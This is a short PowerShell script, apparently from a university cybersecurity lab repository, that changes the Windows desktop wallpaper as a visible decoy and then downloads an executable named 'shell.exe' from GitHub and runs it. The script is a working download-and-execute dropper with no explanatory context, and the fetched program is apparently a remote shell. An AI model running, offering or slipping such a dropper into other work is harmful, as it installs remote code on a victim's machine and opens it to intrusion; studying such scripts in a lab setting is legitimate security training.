$wallpaperUrl = "https://github.com/ludovic-ggn-univ/tp_cyber/blob/main/wallpaper.jpg?raw=true"
$wallpaperPath = Join-Path (Get-Location) "wallpaper.jpg"
$shellUrl= "https://github.com/ludovic-ggn-univ/tp_cyber/raw/refs/heads/main/shell.exe"
$shellPath = Join-Path (Get-Location) "shell.exe"

Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name wallpaper -Value $wallpaperPath
rundll32.exe user32.dll, UpdatePerUserSystemParameters

Invoke-WebRequest -Uri $shellUrl -OutFile $shellPath
./shell.exe